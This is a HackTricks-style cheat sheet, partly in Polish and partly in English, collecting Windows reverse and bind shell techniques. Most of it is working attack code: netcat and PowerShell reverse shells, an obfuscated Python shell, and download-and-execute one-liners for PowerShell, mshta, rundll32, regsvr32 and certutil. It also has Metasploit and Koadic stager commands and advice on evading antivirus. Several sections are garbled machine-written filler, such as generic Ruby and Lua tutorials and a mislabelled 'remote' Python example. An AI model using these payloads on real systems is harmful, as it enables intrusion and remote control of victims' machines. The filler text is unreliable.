# Shells - Windows

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby móc je szybko naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

Strona [lolbas-project.github.io](https://lolbas-project.github.io/) jest odpowiednikiem dla systemu Windows tak jak [https://gtfobins.github.io/](https://gtfobins.github.io/) jest dla systemu Linux.\
Oczywiście, **w systemie Windows nie ma plików SUID ani uprawnień sudo**, ale warto wiedzieć, **jak** niektóre **binaria** mogą być (nadużywane), aby wykonać pewne nieoczekiwane działania, takie jak **wykonywanie dowolnego kodu**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) to przenośna i bezpieczna alternatywa dla Netcata**. Działa na systemach Unix-like i Win32. Dzięki funkcjom takim jak silne szyfrowanie, wykonywanie programów, dostosowywanie portów źródłowych i ciągłe ponowne łączenie, sbd zapewnia wszechstronne rozwiązanie do komunikacji TCP/IP. Dla użytkowników systemu Windows, wersja sbd.exe z dystrybucji Kali Linux może być używana jako niezawodna zamiennik dla Netcata.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python

Python jest popularnym językiem programowania, który może być używany do tworzenia różnych narzędzi i skryptów w celu ułatwienia procesu testowania penetracyjnego. Poniżej przedstawiam kilka przykładów użycia Pythona w kontekście testowania penetracyjnego na systemach Windows.

### Powłoka systemowa

Python może być używany do uruchamiania poleceń systemowych na zdalnym systemie Windows. Można to zrobić za pomocą modułu `subprocess`, który umożliwia wywoływanie poleceń systemowych i przechwytywanie ich wyników. Poniżej znajduje się przykład użycia Pythona do uruchomienia powłoki systemowej na zdalnym systemie Windows:

```python
import subprocess

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output.decode(), error.decode()

command = 'cmd.exe /c whoami'
output, error = run_command(command)
print('Output:', output)
print('Error:', error)
```

### Wykonywanie kodu PowerShell

Python może również być używany do wykonywania kodu PowerShell na zdalnym systemie Windows. Można to zrobić za pomocą modułu `subprocess`, podobnie jak w przypadku uruchamiania poleceń systemowych. Poniżej znajduje się przykład użycia Pythona do wykonania kodu PowerShell na zdalnym systemie Windows:

```python
import subprocess

def run_powershell_code(code):
    command = ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', code]
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output.decode(), error.decode()

code = 'Write-Host "Hello, World!"'
output, error = run_powershell_code(code)
print('Output:', output)
print('Error:', error)
```

### Manipulowanie rejestrem systemu

Python może być również używany do manipulowania rejestrem systemu na zdalnym systemie Windows. Można to zrobić za pomocą modułu `winreg`, który umożliwia odczytywanie, zapisywanie i usuwanie kluczy rejestru. Poniżej znajduje się przykład użycia Pythona do odczytywania wartości klucza rejestru na zdalnym systemie Windows:

```python
import winreg

def read_registry_value(key_path, value_name):
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
    value = winreg.QueryValueEx(key, value_name)
    return value[0]

key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion'
value_name = 'ProgramFilesDir'
value = read_registry_value(key_path, value_name)
print('Value:', value)
```

### Przechwytywanie ekranu

Python może być również używany do przechwytywania ekranu zdalnego systemu Windows. Można to zrobić za pomocą modułu `pyautogui`, który umożliwia przechwytywanie ekranu i zapisywanie go do pliku. Poniżej znajduje się przykład użycia Pythona do przechwytywania ekranu zdalnego systemu Windows:

```python
import pyautogui

screenshot = pyautogui.screenshot()
screenshot.save('screenshot.png')
print('Screenshot saved')
```

### Podsumowanie

Python jest potężnym narzędziem, które można wykorzystać do różnych zadań związanych z testowaniem penetracyjnym na systemach Windows. Powyższe przykłady pokazują tylko kilka możliwości użycia Pythona w tym kontekście.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl jest popularnym językiem skryptowym, który jest często wykorzystywany w celu zdalnego wykonywania poleceń na systemach Windows. Aby użyć Perla do zdalnego dostępu do powłoki systemu Windows, możesz skorzystać z następującego kodu:

```perl
use strict;
use warnings;
use Win32::OLE;

my $host = "adres_IP";
my $username = "nazwa_użytkownika";
my $password = "hasło";

my $locator = Win32::OLE->new('WbemScripting.SWbemLocator');
my $service = $locator->ConnectServer($host, 'root\\cimv2', $username, $password);

my $command = "cmd.exe /c whoami";
my $process = $service->Get("Win32_Process")->Create($command, undef, undef);

print "Wynik: " . $process->{ProcessId} . "\n";
```

Ten kod używa modułu `Win32::OLE`, który umożliwia komunikację z usługami systemu Windows. Połączenie z serwerem jest nawiązywane za pomocą metody `ConnectServer`, a następnie tworzony jest proces za pomocą metody `Create` z użyciem polecenia `cmd.exe /c whoami`. Wynik jest wypisywany na ekranie.

Pamiętaj, że przed użyciem Perla do zdalnego dostępu do powłoki systemu Windows, musisz mieć uprawnienia administratora na docelowym systemie.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby to język programowania, który jest często używany do tworzenia skryptów i aplikacji webowych. Jest to język interpretowany, co oznacza, że kod źródłowy jest kompilowany w locie. Ruby jest również dynamicznie typowany, co oznacza, że nie musisz deklarować typów zmiennych przed ich użyciem.

### Instalacja Ruby

Aby zainstalować Ruby na systemie Windows, możesz skorzystać z narzędzia RubyInstaller. Możesz pobrać najnowszą wersję RubyInstaller ze strony [rubyinstaller.org](https://rubyinstaller.org/). Po pobraniu i uruchomieniu instalatora, postępuj zgodnie z instrukcjami, aby zainstalować Ruby na swoim systemie.

### Uruchamianie skryptów Ruby

Aby uruchomić skrypt Ruby, otwórz wiersz polecenia i wpisz `ruby nazwa_pliku.rb`, gdzie `nazwa_pliku.rb` to nazwa twojego pliku skryptu Ruby z rozszerzeniem `.rb`. Następnie naciśnij Enter, aby uruchomić skrypt.

### Podstawowe składniki języka Ruby

Ruby ma wiele podstawowych składników, które warto poznać. Oto kilka z nich:

- Zmienne: W Ruby możesz tworzyć zmienne, które przechowują wartości. Możesz przypisać wartość do zmiennej za pomocą operatora przypisania `=`. Na przykład: `x = 5`.

- Tablice: Tablice w Ruby służą do przechowywania wielu wartości w jednej zmiennej. Możesz tworzyć tablice za pomocą nawiasów kwadratowych `[]`. Na przykład: `numbers = [1, 2, 3, 4, 5]`.

- Pętle: Pętle w Ruby pozwalają na powtarzanie określonych czynności. Możesz użyć pętli `each` do iteracji po elementach tablicy. Na przykład:

```ruby
numbers = [1, 2, 3, 4, 5]
numbers.each do |number|
  puts number
end
```

- Warunki: Warunki w Ruby pozwalają na wykonywanie różnych czynności w zależności od spełnienia określonego warunku. Możesz użyć instrukcji warunkowej `if` do sprawdzenia warunku. Na przykład:

```ruby
x = 5
if x > 3
  puts "x jest większe od 3"
else
  puts "x jest mniejsze lub równe 3"
end
```

To tylko kilka podstawowych składników języka Ruby. Istnieje wiele innych funkcji i bibliotek, które można wykorzystać do tworzenia zaawansowanych aplikacji.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua jest skryptowym językiem programowania, który jest często używany do tworzenia skryptów i rozszerzeń w różnych aplikacjach. Lua jest często stosowana w grach komputerowych, systemach wbudowanych i aplikacjach internetowych. Lua jest łatwa do nauki i ma prostą składnię, co czyni ją popularnym wyborem dla programistów.

### Uruchamianie skryptów Lua

Aby uruchomić skrypt Lua, można użyć interpretera Lua lub zintegrować go z innym językiem programowania. Interpreter Lua jest dostępny dla wielu systemów operacyjnych i można go pobrać z oficjalnej strony Lua.

### Podstawowe składniki Lua

Lua ma kilka podstawowych składników, które warto znać:

- **Zmienne**: W Lua można tworzyć zmienne i przypisywać im wartości. Zmienne w Lua są dynamicznie typowane, co oznacza, że nie trzeba deklarować ich typu.

- **Funkcje**: W Lua można tworzyć funkcje, które mogą być wywoływane w różnych miejscach w skrypcie. Funkcje w Lua mogą przyjmować argumenty i zwracać wartości.

- **Tablice**: Tablice w Lua są strukturami danych, które przechowują zbiór wartości. Tablice w Lua są indeksowane od 1.

- **Warunki**: W Lua można używać instrukcji warunkowych, takich jak if-else, aby wykonywać różne działania w zależności od spełnienia określonych warunków.

- **Pętle**: W Lua można używać pętli, takich jak for i while, do iteracji przez zbiory danych lub wykonania określonych działań wielokrotnie.

### Przykład skryptu Lua

Oto przykładowy skrypt Lua, który oblicza sumę dwóch liczb:

```lua
function add(a, b)
    return a + b
end

num1 = 10
num2 = 20

result = add(num1, num2)

print("Suma:", result)
```

W tym przykładzie definiujemy funkcję `add`, która przyjmuje dwa argumenty `a` i `b` i zwraca ich sumę. Następnie tworzymy dwie zmienne `num1` i `num2`, przypisujemy im wartości 10 i 20, a następnie wywołujemy funkcję `add` z tymi zmiennymi jako argumentami. Wynik jest przypisywany do zmiennej `result`, a następnie jest wyświetlany na ekranie za pomocą funkcji `print`.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Atakujący (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Windows Shells

## Introduction

In the context of hacking, a shell refers to a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on a Windows machine.

## Reverse Shells

A reverse shell is a technique where the compromised system connects back to the attacker's machine, allowing the attacker to execute commands remotely. There are several ways to achieve a reverse shell on a Windows system:

### Netcat

Netcat is a versatile networking utility that can be used to establish a reverse shell connection. The following command can be used to create a reverse shell using Netcat:

```bash
nc -e cmd.exe <attacker_ip> <port>
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### PowerShell

PowerShell is a powerful scripting language built into Windows. It can be used to create a reverse shell connection using the following command:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### Metasploit

Metasploit is a popular framework for developing and executing exploits. It provides a wide range of modules, including ones for creating reverse shells on Windows systems. The following command can be used to create a reverse shell using Metasploit:

```bash
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

## Bind Shells

A bind shell is a technique where the compromised system listens for incoming connections from the attacker's machine, allowing the attacker to execute commands remotely. Here are a few methods to achieve a bind shell on a Windows system:

### Netcat

Netcat can also be used to create a bind shell connection. The following command can be used to create a bind shell using Netcat:

```bash
nc -lvp <port> -e cmd.exe
```

Replace `<port>` with the desired port number.

### PowerShell

PowerShell can be used to create a bind shell connection using the following command:

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, <port>); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

Replace `<port>` with the desired port number.

### Metasploit

Metasploit can also be used to create a bind shell on a Windows system. The following command can be used with Metasploit:

```bash
use exploit/multi/handler
set payload windows/shell_bind_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

## Conclusion

Obtaining a shell on a Windows system is a crucial step in the hacking process. Reverse shells and bind shells provide attackers with remote access to compromised systems, allowing them to execute commands and further exploit the target. It is important to understand these techniques in order to defend against them effectively.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell jest potężnym narzędziem do zarządzania i automatyzacji systemów Windows. Może być również wykorzystywany przez hakerów do wykonywania różnych działań na zdalnych maszynach.

### Uruchamianie Powershella

Powershell można uruchomić w systemie Windows poprzez wpisanie polecenia `powershell` w wierszu poleceń lub uruchomienie programu `powershell.exe`. Można również uruchomić Powershella w trybie administratora, aby uzyskać pełne uprawnienia.

### Skrypty Powershella

Powershell umożliwia tworzenie skryptów, które zawierają zestaw poleceń do wykonania. Skrypty Powershella mają rozszerzenie `.ps1` i mogą być uruchamiane za pomocą polecenia `powershell.exe -File <ścieżka_do_skryptu>`.

### Wykonywanie poleceń w Powershellu

W Powershellu można wykonywać różne polecenia, takie jak uruchamianie programów, manipulowanie plikami, zarządzanie usługami itp. Polecenia można wykonywać bezpośrednio w wierszu poleceń Powershella lub za pomocą skryptów.

### Zdalne wykonanie poleceń

Powershell umożliwia zdalne wykonanie poleceń na innych maszynach w sieci. Można to zrobić za pomocą polecenia `Invoke-Command`, które pozwala na uruchomienie poleceń na zdalnej maszynie.

### Wykorzystywanie Powershella w celach hakerskich

Hakerzy mogą wykorzystywać Powershella do różnych celów, takich jak zdalne uruchamianie złośliwego oprogramowania, wykonywanie ataków typu "living off the land" (wykorzystujących narzędzia systemowe), manipulowanie plikami i rejestrem, przechwytywanie danych itp.

### Zabezpieczenia Powershella

Aby zabezpieczyć system przed nadużyciem Powershella, można zastosować różne środki, takie jak ograniczenie uprawnień użytkowników, monitorowanie aktywności Powershella, stosowanie zasad grupy, blokowanie nieznanych skryptów itp.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Proces wykonujący żądanie sieciowe: **powershell.exe**\
Payload zapisany na dysku: **NIE** (_przynajmniej nigdzie nie znalazłem tego używając procmon!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Proces wykonujący żądanie sieciowe: **svchost.exe**\
Dane wyjściowe zapisane na dysku: **Lokalna pamięć podręczna klienta WebDAV**

**Jednolinijkowiec:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Uzyskaj więcej informacji na temat różnych powłok Powershell na końcu tego dokumentu**

## Mshta

* [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Przykład odwróconego powłoki hta-psh (użyj hta do pobrania i uruchomienia tylnych drzwi PS)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Możesz bardzo łatwo pobrać i uruchomić zombi Koadic, używając stagera hta**

#### Przykład hta

[**Stąd**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Stąd**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a utility in Windows that allows you to execute HTML applications (HTAs). It can be used as a vector for delivering malicious payloads. In this section, we will explore how to use Mshta with Metasploit to gain remote access to a target system.

To start, we need to generate an HTA payload using Metasploit. We can do this by using the `msfvenom` command. Here is an example command to generate an HTA payload:

```
msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker IP> LPORT=<attacker port> -f hta-psh -o payload.hta
```

Replace `<attacker IP>` with your IP address and `<attacker port>` with the port you want to use for the reverse connection.

Once the payload is generated, we can use Mshta to execute it on the target system. We can do this by running the following command:

```
mshta payload.hta
```

This will open a window on the target system, executing the payload and establishing a reverse HTTPS connection to our machine.

To interact with the session, we can use the `sessions` command in Metasploit. For example, to interact with session 1, we can run the following command:

```
sessions -i 1
```

From here, we have full control over the target system and can perform various post-exploitation activities.

It is important to note that using Mshta with Metasploit may trigger antivirus alerts. To bypass antivirus detection, you can use techniques such as obfuscation or encryption.

Remember to always use these techniques responsibly and with proper authorization. Unauthorized access to computer systems is illegal and unethical.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Wykryte przez defendera**




## **Rundll32**

[**Przykład DLL hello world**](https://github.com/carterjones/hello-world-dll)

* [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Wykryte przez defendera**

**Rundll32 - sct**

[**Stąd**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files. Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/local/hta_print_uaf` that leverages the Rundll32 utility to execute malicious code.

To use this module, follow these steps:

1. Set the required options:
   - `SESSION`: The session to run the exploit on.
   - `DLL_PATH`: The path to the DLL file to execute.
   - `FUNCTION_NAME`: The name of the function within the DLL to execute.

2. Run the exploit by executing the `exploit` command.

Once the exploit is successful, the specified DLL file will be executed using the Rundll32 utility, allowing the execution of arbitrary code on the target system.

It is important to note that the Rundll32 utility can be used for both legitimate and malicious purposes. As a penetration tester, it is crucial to use this technique responsibly and with proper authorization.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files. Koadic is a post-exploitation tool that uses the Rundll32 utility to load a malicious DLL file and gain control over a compromised system.

To use Koadic, follow these steps:

1. Generate a malicious DLL file using Koadic's stager module.
2. Transfer the DLL file to the target system.
3. Use Rundll32 to execute the DLL file on the target system.
4. Gain control over the compromised system using Koadic's implant module.

Here is an example of how to use Rundll32 with Koadic:

```plaintext
rundll32.exe <path_to_dll_file>,<entry_point>
```

Replace `<path_to_dll_file>` with the path to the malicious DLL file and `<entry_point>` with the entry point function of the DLL.

Keep in mind that using Rundll32 with Koadic requires prior access to the target system and the ability to transfer files to it. Additionally, it is important to take precautions to avoid detection and maintain persistence on the compromised system.

For more information on using Rundll32 with Koadic, refer to the Koadic documentation.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Wykryte przez defendera**

#### Regsvr32 -sct

[**Stąd**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLL files. However, it can also be leveraged as a technique for executing malicious code on a target system. In this case, we will explore how to use Regsvr32 with Metasploit to achieve remote code execution.

##### **Step 1: Generate the Payload**

First, we need to generate a payload using Metasploit. This payload will be executed on the target system when we run Regsvr32. To generate the payload, we can use the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
```

Replace `<attacker IP>` with your IP address and `<attacker port>` with the port you want to use for the reverse connection.

##### **Step 2: Set Up the Listener**

Next, we need to set up a listener in Metasploit to receive the reverse connection from the target system. Open Metasploit and use the following commands:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
exploit
```

Again, replace `<attacker IP>` and `<attacker port>` with your IP address and the port you specified in Step 1.

##### **Step 3: Host the Payload**

Now, we need to host the payload DLL file on a web server. You can use any web server of your choice to host the file.

##### **Step 4: Execute the Payload**

Finally, we can execute the payload on the target system using Regsvr32. Open a command prompt on the target system and run the following command:

```
regsvr32 /s /u http://<attacker IP>/<path to payload.dll>
```

Replace `<attacker IP>` with the IP address of your web server and `<path to payload.dll>` with the path to the hosted payload DLL file.

Once the command is executed, the payload will be downloaded from the web server and executed on the target system, establishing a reverse connection to your listener in Metasploit.

This technique can be useful for bypassing security controls that may block other common methods of code execution. However, it is important to note that it relies on the target system having internet access to download the payload from the web server.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Możesz bardzo łatwo pobrać i uruchomić zombi Koadic, używając stagera regsvr**

## Certutil

* [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

Pobierz plik B64dll, zdekoduj go i uruchom.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Pobierz plik B64exe, zdekoduj go i wykonaj.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Wykryte przez defendera**


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

